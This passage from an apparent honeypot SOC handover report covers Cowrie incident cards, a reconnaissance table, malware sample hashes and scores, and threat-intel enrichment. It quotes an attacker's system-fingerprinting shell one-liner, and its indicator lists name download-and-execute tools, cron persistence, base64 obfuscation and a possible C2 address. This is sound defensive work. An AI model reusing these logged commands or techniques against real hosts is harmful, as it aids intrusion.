- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a152d4d14b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 06:41 |
| **Last Seen** | 2026-09-04 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:41:41` | `cowrie.session.connect` |
| `2026-09-04 06:41:41` | `cowrie.client.version` |
| `2026-09-04 06:41:41` | `cowrie.client.kex` |
| `2026-09-04 06:41:42` | `cowrie.login.success` |
| `2026-09-04 06:41:42` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:41:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 06:41:42` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c37c4cb51f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 06:50 |
| **Last Seen** | 2026-09-04 06:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:50:30` | `cowrie.session.connect` |
| `2026-09-04 06:50:31` | `cowrie.client.version` |
| `2026-09-04 06:50:31` | `cowrie.client.kex` |
| `2026-09-04 06:50:33` | `cowrie.login.success` |
| `2026-09-04 06:50:36` | `cowrie.session.params` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.success` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.command.input` |
| `2026-09-04 06:50:36` | `cowrie.log.closed` |
| `2026-09-04 06:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f44fc698ab3f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 06:52 |
| **Last Seen** | 2026-09-04 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:52:40` | `cowrie.session.connect` |
| `2026-09-04 06:52:40` | `cowrie.client.version` |
| `2026-09-04 06:52:40` | `cowrie.client.kex` |
| `2026-09-04 06:52:41` | `cowrie.login.success` |
| `2026-09-04 06:52:41` | `cowrie.direct-tcpip.request` |
| `2026-09-04 06:52:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 06:52:41` | `cowrie.direct-tcpip.data` |
| `2026-09-04 06:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b2380cb379e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 06:52 |
| **Last Seen** | 2026-09-04 06:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:52:47` | `cowrie.session.connect` |
| `2026-09-04 06:52:48` | `cowrie.client.version` |
| `2026-09-04 06:52:48` | `cowrie.client.kex` |
| `2026-09-04 06:52:50` | `cowrie.login.success` |
| `2026-09-04 06:52:52` | `cowrie.session.params` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.success` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:52` | `cowrie.command.input` |
| `2026-09-04 06:52:53` | `cowrie.log.closed` |
| `2026-09-04 06:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb2a9a67e11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 06:54 |
| **Last Seen** | 2026-09-04 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:54:58` | `cowrie.session.connect` |
| `2026-09-04 06:54:59` | `cowrie.client.version` |
| `2026-09-04 06:54:59` | `cowrie.client.kex` |
| `2026-09-04 06:55:02` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.94.9[.]45` | **8** | 2026-09-04 05:29 | 2026-09-04 05:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-09-04 03:00 | 2026-09-04 03:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]125` | **5** | 2026-09-04 04:01 | 2026-09-04 04:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | **4** | 2026-09-04 04:01 | 2026-09-04 04:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]63` | **4** | 2026-09-04 03:59 | 2026-09-04 04:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.62.9[.]132` | **3** | 2026-09-04 04:49 | 2026-09-04 04:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]185` | **3** | 2026-09-04 04:01 | 2026-09-04 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]214` | **3** | 2026-09-04 04:02 | 2026-09-04 04:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `4.236.163[.]160` | **2** | 2026-09-04 03:22 | 2026-09-04 03:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.74.209[.]102` | **2** | 2026-09-04 04:09 | 2026-09-04 04:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | **2** | 2026-09-04 04:00 | 2026-09-04 04:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `79.108.228[.]246` | **2** | 2026-09-04 05:43 | 2026-09-04 05:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-09-04 03:59 | 2026-09-04 04:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-09-04 03:39 | 2026-09-04 03:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.155.46[.]74` | 1 | 2026-09-04 04:49 | 2026-09-04 04:49 | 5s | 0 | `T1592` | 🟢 LOW |
| `125.122.39[.]115` | 1 | 2026-09-04 04:01 | 2026-09-04 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]101` | 1 | 2026-09-04 04:08 | 2026-09-04 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.34.73[.]168` | 1 | 2026-09-04 03:13 | 2026-09-04 03:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-09-04 06:29 | 2026-09-04 06:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `191.88.75[.]196` | 1 | 2026-09-04 04:25 | 2026-09-04 04:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]221` | 1 | 2026-09-04 06:30 | 2026-09-04 06:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]229` | 1 | 2026-09-04 06:30 | 2026-09-04 06:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.3.53[.]2` | 1 | 2026-09-04 05:38 | 2026-09-04 05:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-09-04 04:02 | 2026-09-04 04:02 | 1s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-09-04 06:39 | 2026-09-04 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]55` | 1 | 2026-09-04 04:08 | 2026-09-04 04:08 | 10s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]4` | 1 | 2026-09-04 03:26 | 2026-09-04 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `209.15.179[.]191` | 1 | 2026-09-04 05:33 | 2026-09-04 05:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]89` | 1 | 2026-09-04 04:01 | 2026-09-04 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.134.74[.]196` | 1 | 2026-09-04 05:02 | 2026-09-04 05:02 | 10s | 0 | `T1592` | 🟢 LOW |
| `31.43.49[.]235` | 1 | 2026-09-04 04:59 | 2026-09-04 04:59 | 14s | 0 | `T1592` | 🟢 LOW |
| `38.9.86[.]97` | 1 | 2026-09-04 05:02 | 2026-09-04 05:02 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-09-04 06:41 | 2026-09-04 06:41 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-09-04 05:40 | 2026-09-04 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.41.106[.]146` | 1 | 2026-09-04 04:28 | 2026-09-04 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-09-04 03:55 | 2026-09-04 03:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-09-04 06:41 | 2026-09-04 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-09-04 05:46 | 2026-09-04 05:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.237.183[.]136` | 1 | 2026-09-04 04:35 | 2026-09-04 04:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-09-04 04:03 | 2026-09-04 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]38` | 1 | 2026-09-04 05:05 | 2026-09-04 05:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-09-04 03:24 | 2026-09-04 03:24 | 2s | 0 | `T1592` | 🟢 LOW |
| `75.111.178[.]25` | 1 | 2026-09-04 04:19 | 2026-09-04 04:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.89.199[.]242` | 1 | 2026-09-04 04:52 | 2026-09-04 04:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]70` | 1 | 2026-09-04 06:18 | 2026-09-04 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]94` | 1 | 2026-09-04 06:18 | 2026-09-04 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]208` | 1 | 2026-09-04 04:32 | 2026-09-04 04:34 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `66.132.172[.]214` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `34.62.9[.]132` | BE | Google LLC | **100** ⚠️ | 3 |
| `31.134.74[.]196` | UA | Lanet Network Ltd | **100** ⚠️ | 1 |
| `75.111.178[.]25` | US | Optimum | **100** ⚠️ | 0 |
| `103.203.57[.]2` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `80.89.199[.]242` | RU | 'Ch' area end users network | **100** ⚠️ | 6 |
| `38.9.86[.]97` | CA | OXIO | **100** ⚠️ | 1 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 141 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 114 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 45 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 44 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 44 |

---

## 🔕 False Positive Summary (50 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 41 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 244 cases |
| Tool 34  | Credential Extractor        | ✅ 125 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 76 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 50 filtered (20.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 114 priority case(s) shown individually · 47 recon entry/entries in table (13 group(s) consolidating 46 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

